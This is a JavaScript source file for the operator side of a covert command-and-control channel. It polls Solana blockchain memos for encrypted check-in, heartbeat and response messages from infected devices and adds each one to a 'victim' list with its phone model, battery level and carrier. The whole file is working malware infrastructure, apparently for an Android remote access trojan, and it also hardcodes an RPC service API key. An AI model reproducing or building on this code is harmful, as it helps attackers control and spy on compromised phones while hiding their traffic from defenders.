/**
 * Blockchain Listener for Electron GUI
 * Polls blockchain for client INIT/heartbeat messages and responses
 * Integrates with victim list just like Socket.IO connections
 */

const { Connection, PublicKey } = require('@solana/web3.js');
const crypto = require('crypto');
const bs58 = require('bs58');
const EventEmitter = require('events');

class BlockchainListener extends EventEmitter {
  constructor(config) {
    super();
    this.rpcUrl = config.rpcUrl || process.env.BLOCKCHAIN_RPC_URL || 'https://api.devnet.solana.com';
    this.channelAddress = config.channelAddress || process.env.BLOCKCHAIN_CONTRACT_ADDRESS;
    this.aesKeyHex = config.aesKeyHex || process.env.BLOCKCHAIN_C2_AES_KEY;
    this.pollInterval = parseInt(config.pollInterval || process.env.POLL_INTERVAL || '30000', 10);

    this.seenSignatures = new Set();
    this.chunkBuffers = new Map();
    this.clients = new Map(); // clientId -> client info
    this.listenerStartTime = Date.now();
    this.pollTimer = null;
    this.isRunning = false;

    // RPC failover - Public endpoints only
    this.rpcCandidates = [
      this.rpcUrl,
      process.env.SOLANA_RPC_URL,
      'https://api.devnet.solana.com',
      'https://api.testnet.solana.com',
      'https://rpc.ankr.com/solana_devnet',
      'https://devnet.helius-rpc.com/?api-key=288d548c-1be7-4db4-86c3-60300d282efa' // Helius API key (max 10 req/s)
    ].filter(Boolean).filter((url, index, self) => self.indexOf(url) === index && !url.includes('alchemy')); // Remove demo keys

    this.currentRpcIndex = 0;
  }

  /**
   * Start blockchain listener
   */
  async start() {
    if (this.isRunning) {
      console.log('[BlockchainListener] Already running');
      return;
    }

    if (!this.channelAddress) {
      throw new Error('Missing channel address (BLOCKCHAIN_CONTRACT_ADDRESS)');
    }

    this.isRunning = true;
    console.log('[BlockchainListener] Starting...');
    console.log(`[BlockchainListener] RPC: ${this.rpcUrl}`);
    console.log(`[BlockchainListener] Channel: ${this.channelAddress}`);
    console.log(`[BlockchainListener] Poll Interval: ${this.pollInterval}ms`);

    // Start polling loop
    this.pollLoop();
    
    this.emit('started');
  }

  /**
   * Stop blockchain listener
   */
  stop() {
    if (!this.isRunning) {
      return;
    }

    console.log('[BlockchainListener] Stopping...');
    this.isRunning = false;

    if (this.pollTimer) {
      clearTimeout(this.pollTimer);
      this.pollTimer = null;
    }

    this.emit('stopped');
  }

  /**
   * Polling loop
   */
  async pollLoop() {
    if (!this.isRunning) return;

    try {
      await this.poll();
    } catch (err) {
      console.error(`[BlockchainListener] Poll cycle error: ${err.message}`);
    }

    if (this.isRunning) {
      this.pollTimer = setTimeout(() => this.pollLoop(), this.pollInterval);
    }
  }

  /**
   * Poll blockchain for new transactions
   */
  async poll() {
    if (!this.isRunning) return;

    try {
      const connection = await this.getHealthyConnection();
      const channelPubkey = new PublicKey(this.channelAddress);

      // console.log(`[BlockchainListener] Polling ${this.channelAddress.substring(0,8)}...`);

      const sigInfos = await connection.getSignaturesForAddress(channelPubkey, { limit: 20 }, 'confirmed');

      let newTxCount = 0;
      for (const info of sigInfos) {
        if (!info || !info.signature) continue;
        if (this.seenSignatures.has(info.signature)) continue;

        // Skip old transactions (5 minute grace period)
        if (info.blockTime && this.listenerStartTime > 0) {
          const txTimeMs = info.blockTime * 1000;
          if (txTimeMs < (this.listenerStartTime - 300000)) {
            continue;
          }
        }

        this.seenSignatures.add(info.signature);
        newTxCount++;

        // Limit seen signatures set size
        if (this.seenSignatures.size > 1000) {
          const arr = Array.from(this.seenSignatures);
          this.seenSignatures.clear();
          arr.slice(-500).forEach(sig => this.seenSignatures.add(sig));
        }

        try {
          // Get transaction
          const tx = await connection.getParsedTransaction(info.signature, {
            commitment: 'confirmed',
            maxSupportedTransactionVersion: 0
          });

          if (!tx) continue;

          const memos = this.extractMemosFromTx(tx);

          for (const memo of memos) {
            if (!memo) continue;

            // Skip outgoing commands
            if (memo.startsWith('CMD:')) {
              continue;
            }

            // Handle chunked responses
            if (memo.startsWith('RESPCH:')) {
              const match = memo.match(/^RESPCH:([A-Za-z0-9]+):([0-9]+)\/([0-9]+):([0-9a-fA-F]+)$/);
              if (match) {
                const chunkId = match[1];
                const part = parseInt(match[2], 10);
                const total = parseInt(match[3], 10);
                const chunkHex = match[4];

                let entry = this.chunkBuffers.get(chunkId);
                if (!entry) {
                  entry = { total, parts: new Array(total).fill(null), received: 0 };
                }
                if (!entry.parts[part - 1]) {
                  entry.parts[part - 1] = chunkHex;
                  entry.received += 1;
                  console.log(`[BlockchainListener] Chunk ${part}/${total} for ${chunkId}`);
                }
                this.chunkBuffers.set(chunkId, entry);

                if (entry.received === entry.total) {
                  const assembled = entry.parts.join('');
                  this.chunkBuffers.delete(chunkId);
                  const decrypted = this.decryptMemoPayload(assembled);
                  if (decrypted) {
                    this.processResponse(decrypted, info.signature);
                  }
                }
              }
              continue;
            }

            // Handle regular responses
            if (memo.startsWith('RESP:') || memo.startsWith('INIT:')) {
              const hexPayload = memo.substring(5);
              const decrypted = this.decryptMemoPayload(hexPayload);
              if (decrypted) {
                this.processResponse(decrypted, info.signature);
              }
            }
          }
        } catch (err) {
          console.error(`[BlockchainListener] Error processing tx ${info.signature.substring(0, 8)}...: ${err.message}`);
        }
      }

      if (newTxCount > 0) {
        console.log(`[BlockchainListener] Processed ${newTxCount} new transaction(s)`);
      }
    } catch (err) {
      console.error(`[BlockchainListener] Poll error: ${err.message}`);
    }
  }

  /**
   * Get healthy Solana connection
   */
  async getHealthyConnection() {
    let lastErr = null;
    for (let i = 0; i < this.rpcCandidates.length; i++) {
      const idx = (this.currentRpcIndex + i) % this.rpcCandidates.length;
      const rpc = this.rpcCandidates[idx];
      if (!rpc) continue;

      try {
        const conn = new Connection(rpc, 'confirmed');
        await conn.getLatestBlockhash('confirmed');
        this.currentRpcIndex = idx;
        if (i > 0) {
          console.log(`[BlockchainListener] Switched to RPC: ${rpc}`);
          this.rpcUrl = rpc;
        }
        return conn;
      } catch (err) {
        lastErr = err;
        console.warn(`[BlockchainListener] RPC failed (${rpc}): ${err.message}`);
      }
    }
    throw lastErr || new Error('No RPC endpoint available');
  }

  /**
   * Extract memos from transaction
   */
  extractMemosFromTx(tx) {
    const memos = [];
    if (!tx || !tx.meta) return memos;

    // Check log messages
    if (tx.meta.logMessages) {
      for (const logMsg of tx.meta.logMessages) {
        const memoMatch = logMsg.match(/Program log: Memo \(len \d+\): "?(.+?)"?$/);
        if (memoMatch && memoMatch[1]) {
          memos.push(memoMatch[1]);
        }
      }
    }

    // Check parsed instructions
    if (tx.transaction && tx.transaction.message && tx.transaction.message.instructions) {
      for (const instr of tx.transaction.message.instructions) {
        if (instr.parsed && typeof instr.parsed === 'string') {
          memos.push(instr.parsed);
        } else if (instr.parsed && instr.parsed.info && instr.parsed.info.memo) {
          memos.push(instr.parsed.info.memo);
        } else if (instr.data) {
          try {
            const decoded = Buffer.from(bs58.decode(instr.data)).toString('utf8');
            if (decoded.startsWith('RESP:') || decoded.startsWith('RESPCH:') || decoded.startsWith('CMD:') || decoded.startsWith('INIT:')) {
              memos.push(decoded);
            }
          } catch (e) {
            // Not base58 or not a memo
          }
        }
      }
    }

    return memos;
  }

  /**
   * Decrypt memo payload
   */
  decryptMemoPayload(hexPayload) {
    try {
      const buf = Buffer.from(hexPayload, 'hex');
      if (buf.length < 28) return null;
      const iv = buf.slice(0, 12);
      const tag = buf.slice(-16);
      const ciphertext = buf.slice(12, -16);
      const key = Buffer.from(this.aesKeyHex, 'hex');
      const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
      decipher.setAuthTag(tag);
      const decrypted = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
      return decrypted.toString('utf8');
    } catch (e) {
      console.error(`[BlockchainListener] Decrypt error: ${e.message}`);
      return null;
    }
  }

  /**
   * Process blockchain response
   */
  processResponse(decrypted, signature) {
    try {
      const parsed = JSON.parse(decrypted);
      const eventName = parsed.event || 'unknown';
      const data = parsed.data || parsed;
      const clientId = data.id || data.clientId || data.deviceId || parsed.id || signature.substring(0, 16);

      console.log(`[BlockchainListener] ${eventName} from ${clientId.substring(0, 8)}...`);

      if (eventName === 'init') {
        if (!this.clients.has(clientId)) {
          const clientInfo = {
            id: clientId,
            connectedAt: Date.now(),
            lastSeen: Date.now(),
            data: data,
            isBlockchain: true
          };
          this.clients.set(clientId, clientInfo);
          console.log(`[BlockchainListener] New client: ${clientId}`);

          // Emit new victim event (similar to Socket.IO connection)
          this.emit('newClient', {
            id: clientId,
            manf: data.manf || 'Unknown',
            model: data.model || 'Unknown',
            release: data.release || 'Unknown',
            sdk: data.sdk || 'Unknown',
            battery: data.battery || '?',
            operator: data.operator || 'Unknown',
            data: data,
            isBlockchain: true
          });
        }
      } else if (eventName === 'heartbeat') {
        const client = this.clients.get(clientId);
        if (client) {
          client.lastSeen = Date.now();
          if (data.battery) client.battery = data.battery;
          console.log(`[BlockchainListener] Heartbeat from ${clientId.substring(0, 8)}... (battery: ${data.battery || '?'}%)`);
        }
      } else {
        // Regular response event
        this.emit('response', {
          clientId: clientId,
          event: eventName,
          data: data
        });
        console.log(`[BlockchainListener] Response ${eventName} from ${clientId.substring(0, 8)}...`);
      }
    } catch (e) {
      console.error(`[BlockchainListener] Failed to parse response: ${e.message}`);
    }
  }

  /**
   * Get all clients
   */
  getClients() {
    return Array.from(this.clients.values());
  }

  /**
   * Get specific client
   */
  getClient(clientId) {
    return this.clients.get(clientId);
  }
}

module.exports = BlockchainListener;
